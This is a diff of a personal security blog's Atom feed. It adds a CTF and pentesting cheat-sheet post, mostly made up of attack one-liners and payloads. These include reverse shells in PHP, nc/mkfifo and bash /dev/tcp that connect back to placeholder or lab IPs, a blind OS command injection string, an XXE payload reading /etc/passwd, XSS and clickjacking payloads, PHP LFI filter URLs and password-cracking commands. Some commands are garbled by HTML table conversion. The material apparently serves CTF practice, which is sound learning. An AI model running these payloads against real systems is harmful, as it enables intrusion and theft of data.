@@ -4,13 +4,159 @@
  <title>0xbeven - Blog Site</title>
  <link href="https://beven.co.zw/atom.xml" rel="self"/>
  <link href="https://beven.co.zw/"/>
- <updated>2021-03-14T02:09:30+02:00</updated>
+ <updated>2021-03-15T23:36:01+02:00</updated>
  <id>https://beven.co.zw</id>
  <author>
    <name>Beven Nyamande</name>
    <email>wasp00007@gmail.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Useful Tricks Tips</title>
+   <link href="https://beven.co.zw/2021/03/15/useful-tricks-tips"/>
+   <updated>2021-03-15T00:00:00+02:00</updated>
+   <id>https://beven.co.zw/2021/03/15/Useful-Tricks-Tips</id>
+   <content type="html">&lt;h1 id=&quot;hashcat&quot;&gt;Hashcat&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;hashcat -m 1800 -a 0 hash.txt rockyou.txt&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;find-command&quot;&gt;Find command&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;find / -type f -newermt 2016-09-11 ! -newermt 2016-09-13 2&amp;gt;/dev/null&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;upgrading-to-a-shell&quot;&gt;Upgrading to a shell&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;python -c ‘import pty;pty.spawn(‘/bin/bash’)’&lt;/li&gt;
+  &lt;li&gt;SHELL=/bin/bash script -q /dev/null&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;php -r ‘$sock=fsockopen(“x.x.x.x”,4444);exec(“/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3”);’&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;m /tmp/f;mkfifo /tmp/f;cat /tmp/f&lt;/td&gt;
+          &lt;td&gt;/bin/sh -i 2&amp;gt;&amp;amp;1&lt;/td&gt;
+          &lt;td&gt;nc 10.8.2.77 9001 &amp;gt;/tmp/f&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;blind-os-injection&quot;&gt;Blind OS injection&lt;/h1&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/var/www/images/output.txt||
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;xxe-attacks&quot;&gt;XXE Attacks&lt;/h1&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;
+&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY read SYSTEM 'file:///etc/passwd'&amp;gt;]&amp;gt;
+&amp;lt;root&amp;gt;&amp;amp;read;&amp;lt;/root&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;xss-payloads&quot;&gt;XSS payloads&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;onclick(alert(&quot;Hello&quot;));&amp;lt;/script&amp;gt;
+// window.location.hostname
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;john-hashing&quot;&gt;John Hashing&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;john –format=raw-md5 –wordlist=/usr/share/wordlists/rockyou.txt hash1.txt&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;encryption-gpg&quot;&gt;Encryption gpg&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;gpg –cipher-algo [encryption type] [encryption method] [file to encrypt]&lt;/li&gt;
+  &lt;li&gt;gpg –cipher-algo AES-256 –symetric xyz.txt&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;decryption&quot;&gt;decryption&lt;/h2&gt;
+&lt;p&gt;– gpg xyz.txt&lt;/p&gt;
+
+&lt;h1 id=&quot;how-to-crack-encrypted-files-using-john-the-ripper&quot;&gt;How to crack encrypted files using john the ripper&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;gpg2john [encrypted gpg file] &amp;gt; [filename of the hash you want to create]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;reverse-a-wordlist&quot;&gt;Reverse a wordlist&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;$ tac data.txt &amp;gt; new_data.txt&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;email-re&quot;&gt;Email re&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;email_re = re.compile(r’([a-zA-Z0-9_+-.]+)@(([[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.)&lt;/td&gt;
+          &lt;td&gt;(([a-zA-Z0-9-]+.)+))([a-zA-Z]{2,4}&lt;/td&gt;
+          &lt;td&gt;[0-9]{1,3})(]?)’)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;php-reverse-shell-function&quot;&gt;Php reverse shell function&lt;/h2&gt;
+&lt;p&gt;function execInBackground($cmd) { 
+                if (substr(php_uname(), 0, 7) == “Windows”){ 
+                                    pclose(popen(“start /B “. $cmd, “r”));&lt;br /&gt;
+                                                    } 
+                                                                    else { 
+                                                                                        exec($cmd . “ &amp;gt; /dev/null &amp;amp;”); &lt;br /&gt;
+                                                                                                            } 
+                                                                                                                            } 
+                                                                                                                                        execInBackground(“/bin/bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/YOUR_IP_HERE/YOUR_PORT_HERE 0&amp;gt;&amp;amp;1’”);&lt;/p&gt;
+&lt;h1 id=&quot;php-lfi&quot;&gt;PHP LFI&lt;/h1&gt;
+&lt;p&gt;http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php&lt;/p&gt;
+
+&lt;h1 id=&quot;practice-labs&quot;&gt;Practice Labs&lt;/h1&gt;
+&lt;p&gt;Capture the Flag (CTF) API Portal&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker pull sbacker/ctfapi
+docker run --name ctfapi1 -p 8000:8000 -it -d sbacker/ctfapi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Witcher Portal&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker pull sbacker/witcherportal
+docker run -it -d --name witcher10 -p8080:8080 -e PYTHONUNBUFFERED=1 sbacker/witcherportal
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;clickjack-attack-payload&quot;&gt;Clickjack Attack Payload&lt;/h1&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;relative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;700px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;500px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0.0001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;z-index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;300px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;60px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+       &lt;span class=&quot;nl&quot;&gt;z-index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&amp;gt;&lt;/span&gt;Click me&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://acbe1f391e8fd65480c7a7ac017500d7.web-security-academy.net/exploit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Nahamcon CTF Challenges</title>
